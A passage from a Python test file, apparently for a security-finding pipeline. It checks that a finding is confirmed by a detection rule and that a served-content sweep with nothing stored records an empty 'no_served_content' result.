    assert (finding["status"], finding["cause"]["by"]) == ("confirmed", "detection_rule")


def test_a_sweep_with_no_stored_served_content_records_none(system, tmp_path):
    app, _, _ = system
    finding, runs = upstream_finding(system, tmp_path)
    assert [call["kind"] for call in runs.calls] == ["agent", "detection_rule"]
    (job,) = jobs(app, "served_content_sweep")
    assert finding["served_content_sweep"] == {
        "artifact_revision": finding["artifact_revision"], "job_id": job.id, "status": "no_served_content",
        "matches": [], "count": 0, "truncated": False}
    assert finding["playbook"][-1] == {"step": "served_content_sweep", "status": "no_served_content"}
